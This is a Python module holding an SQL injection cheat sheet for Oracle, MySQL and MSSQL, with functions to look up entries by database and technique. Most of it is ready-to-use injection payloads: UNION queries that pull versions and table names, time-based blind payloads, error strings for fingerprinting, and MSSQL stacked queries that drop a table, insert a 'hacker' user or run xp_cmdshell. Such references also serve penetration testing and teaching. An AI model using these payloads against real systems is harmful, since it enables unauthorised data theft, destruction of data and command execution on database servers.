"""
SQL Syntax and Error Cheat Sheet

Comprehensive reference dictionary for SQL injection syntax, error messages,
and database-specific features for Oracle, MySQL, and MSSQL databases.
"""

# SQL Syntax and Error Reference Dictionary
SQL_CHEAT_SHEET = {
    'oracle': {
        'name': 'Oracle Database',
        'version_detection': {
            'name': 'Version Detection',
            'description': 'Methods to detect Oracle database version',
            'syntax': [
                "SELECT banner FROM v$version",
                "SELECT version FROM v$instance",
                "SELECT * FROM v$version WHERE banner LIKE 'Oracle%'",
            ],
            'payloads': {
                'string': "' UNION SELECT banner FROM v$version--",
                'numeric': " UNION SELECT banner FROM v$version--",
                'parenthesis': "') UNION SELECT banner FROM v$version--",
            }
        },
        'error_messages': {
            'name': 'Common Error Messages',
            'description': 'Typical Oracle error messages indicating SQL injection',
            'errors': [
                "ORA-00933: SQL command not properly ended",
                "ORA-01756: quoted string not properly terminated",
                "ORA-00923: FROM keyword not found where expected",
                "ORA-00936: missing expression",
                "ORA-01789: query block has incorrect number of result columns",
            ]
        },
        'string_concatenation': {
            'name': 'String Concatenation',
            'description': 'Oracle uses || for string concatenation',
            'syntax': ["'admin'||'123'", "CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110)"],
            'payloads': {
                'string': "' || 'injected'--",
                'numeric': " || 'injected'--",
                'parenthesis': "') || 'injected'--",
            }
        },
        'comments': {
            'name': 'Comment Syntax',
            'description': 'Oracle comment styles',
            'syntax': ['-- single line comment', '/* multi-line comment */'],
            'payloads': {
                'string': "'--",
                'numeric': '--',
                'parenthesis': "')--",
            }
        },
        'union_injection': {
            'name': 'UNION-based Injection',
            'description': 'Oracle requires FROM dual in SELECT statements',
            'syntax': [
                "UNION SELECT NULL FROM dual",
                "UNION SELECT 'a', 'b' FROM dual",
                "UNION SELECT table_name, NULL FROM all_tables",
            ],
            'payloads': {
                'string': "' UNION SELECT NULL FROM dual--",
                'numeric': " UNION SELECT NULL FROM dual--",
                'parenthesis': "') UNION SELECT NULL FROM dual--",
            }
        },
        'time_delay': {
            'name': 'Time-based Blind Injection',
            'description': 'Oracle time delay techniques',
            'syntax': ["DBMS_LOCK.SLEEP(5)", "DBMS_SESSION.SLEEP(5)"],
            'payloads': {
                'string': "' AND DBMS_LOCK.SLEEP(5)--",
                'numeric': " AND DBMS_LOCK.SLEEP(5)--",
                'parenthesis': "') AND DBMS_LOCK.SLEEP(5)--",
            }
        },
        'information_gathering': {
            'name': 'Information Gathering',
            'description': 'Oracle system tables and views',
            'syntax': [
                "SELECT * FROM all_tables",
                "SELECT * FROM all_tab_columns",
                "SELECT * FROM all_users",
                "SELECT username FROM all_users",
            ],
            'payloads': {
                'string': "' UNION SELECT table_name, NULL FROM all_tables--",
                'numeric': " UNION SELECT table_name, NULL FROM all_tables--",
                'parenthesis': "') UNION SELECT table_name, NULL FROM all_tables--",
            }
        }
    },
    'mysql': {
        'name': 'MySQL / MariaDB',
        'version_detection': {
            'name': 'Version Detection',
            'description': 'Methods to detect MySQL version',
            'syntax': [
                "SELECT @@version",
                "SELECT VERSION()",
                "SELECT @@global.version",
            ],
            'payloads': {
                'string': "' UNION SELECT @@version--",
                'numeric': " UNION SELECT @@version--",
                'parenthesis': "') UNION SELECT @@version--",
            }
        },
        'error_messages': {
            'name': 'Common Error Messages',
            'description': 'Typical MySQL error messages indicating SQL injection',
            'errors': [
                "You have an error in your SQL syntax",
                "Warning: mysql_fetch_array()",
                "Warning: mysql_num_rows()",
                "MySQL server version for the right syntax to use",
                "supplied argument is not a valid MySQL result resource",
            ]
        },
        'string_concatenation': {
            'name': 'String Concatenation',
            'description': 'MySQL string concatenation methods',
            'syntax': ["CONCAT('admin', '123')", "'admin' 'space' '123'"],
            'payloads': {
                'string': "' AND 'a'='a",
                'numeric': " AND 1=1",
                'parenthesis': "') AND 'a'='a",
            }
        },
        'comments': {
            'name': 'Comment Syntax',
            'description': 'MySQL comment styles',
            'syntax': ['-- single line (space required)', '# single line', '/*! inline comment */', '/* multi-line */'],
            'payloads': {
                'string': "'-- ",
                'numeric': '-- ',
                'parenthesis': "')-- ",
            }
        },
        'union_injection': {
            'name': 'UNION-based Injection',
            'description': 'MySQL UNION injection techniques',
            'syntax': [
                "UNION SELECT NULL",
                "UNION SELECT 1, 2, 3",
                "UNION SELECT table_name FROM information_schema.tables",
            ],
            'payloads': {
                'string': "' UNION SELECT NULL-- ",
                'numeric': " UNION SELECT NULL-- ",
                'parenthesis': "') UNION SELECT NULL-- ",
            }
        },
        'time_delay': {
            'name': 'Time-based Blind Injection',
            'description': 'MySQL time delay techniques',
            'syntax': ["SLEEP(5)", "BENCHMARK(5000000, MD5('test'))"],
            'payloads': {
                'string': "' AND SLEEP(5)-- ",
                'numeric': " AND SLEEP(5)-- ",
                'parenthesis': "') AND SLEEP(5)-- ",
            }
        },
        'information_gathering': {
            'name': 'Information Gathering',
            'description': 'MySQL information_schema tables',
            'syntax': [
                "SELECT * FROM information_schema.tables",
                "SELECT * FROM information_schema.columns",
                "SELECT schema_name FROM information_schema.schemata",
                "SELECT table_name FROM information_schema.tables WHERE table_schema=database()",
            ],
            'payloads': {
                'string': "' UNION SELECT table_name FROM information_schema.tables-- ",
                'numeric': " UNION SELECT table_name FROM information_schema.tables-- ",
                'parenthesis': "') UNION SELECT table_name FROM information_schema.tables-- ",
            }
        }
    },
    'mssql': {
        'name': 'Microsoft SQL Server',
        'version_detection': {
            'name': 'Version Detection',
            'description': 'Methods to detect MSSQL version',
            'syntax': [
                "SELECT @@version",
                "SELECT SERVERPROPERTY('ProductVersion')",
                "SELECT SERVERPROPERTY('Edition')",
            ],
            'payloads': {
                'string': "' UNION SELECT @@version--",
                'numeric': " UNION SELECT @@version--",
                'parenthesis': "') UNION SELECT @@version--",
            }
        },
        'error_messages': {
            'name': 'Common Error Messages',
            'description': 'Typical MSSQL error messages indicating SQL injection',
            'errors': [
                "Unclosed quotation mark after the character string",
                "Incorrect syntax near",
                "The conversion of the varchar value",
                "Microsoft OLE DB Provider for SQL Server",
                "Warning: mssql_query()",
            ]
        },
        'string_concatenation': {
            'name': 'String Concatenation',
            'description': 'MSSQL uses + for string concatenation',
            'syntax': ["'admin'+'123'", "CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110)"],
            'payloads': {
                'string': "' + 'injected'--",
                'numeric': " + 'injected'--",
                'parenthesis': "') + 'injected'--",
            }
        },
        'comments': {
            'name': 'Comment Syntax',
            'description': 'MSSQL comment styles',
            'syntax': ['-- single line comment', '/* multi-line comment */'],
            'payloads': {
                'string': "'--",
                'numeric': '--',
                'parenthesis': "')--",
            }
        },
        'union_injection': {
            'name': 'UNION-based Injection',
            'description': 'MSSQL UNION injection techniques',
            'syntax': [
                "UNION SELECT NULL",
                "UNION SELECT 1, 2, 3",
                "UNION SELECT name FROM sysobjects WHERE xtype='U'",
            ],
            'payloads': {
                'string': "' UNION SELECT NULL--",
                'numeric': " UNION SELECT NULL--",
                'parenthesis': "') UNION SELECT NULL--",
            }
        },
        'time_delay': {
            'name': 'Time-based Blind Injection',
            'description': 'MSSQL time delay techniques',
            'syntax': ["WAITFOR DELAY '00:00:05'", "WAITFOR TIME '00:00:05'"],
            'payloads': {
                'string': "'; WAITFOR DELAY '00:00:05'--",
                'numeric': "; WAITFOR DELAY '00:00:05'--",
                'parenthesis': "'); WAITFOR DELAY '00:00:05'--",
            }
        },
        'stacked_queries': {
            'name': 'Stacked Queries',
            'description': 'MSSQL supports multiple statements separated by semicolons',
            'syntax': [
                "'; DROP TABLE users--",
                "'; INSERT INTO users VALUES ('hacker', 'pass')--",
                "'; EXEC xp_cmdshell('whoami')--",
            ],
            'payloads': {
                'string': "'; SELECT 1--",
                'numeric': "; SELECT 1--",
                'parenthesis': "'); SELECT 1--",
            }
        },
        'information_gathering': {
            'name': 'Information Gathering',
            'description': 'MSSQL system tables',
            'syntax': [
                "SELECT * FROM information_schema.tables",
                "SELECT * FROM information_schema.columns",
                "SELECT name FROM sysobjects WHERE xtype='U'",
                "SELECT name FROM syscolumns",
            ],
            'payloads': {
                'string': "' UNION SELECT name FROM sysobjects WHERE xtype='U'--",
                'numeric': " UNION SELECT name FROM sysobjects WHERE xtype='U'--",
                'parenthesis': "') UNION SELECT name FROM sysobjects WHERE xtype='U'--",
            }
        }
    }
}


def get_dbms_list():
    """Get list of available DBMS types"""
    return list(SQL_CHEAT_SHEET.keys())


def get_dbms_info(dbms):
    """Get information for a specific DBMS"""
    return SQL_CHEAT_SHEET.get(dbms, {})


def get_injection_types(dbms):
    """Get available injection types for a DBMS"""
    dbms_info = get_dbms_info(dbms)
    return [key for key in dbms_info.keys() if key != 'name']


def get_cheat_sheet_data(dbms, injection_type):
    """Get cheat sheet data for a specific DBMS and injection type"""
    dbms_info = get_dbms_info(dbms)
    return dbms_info.get(injection_type, {})
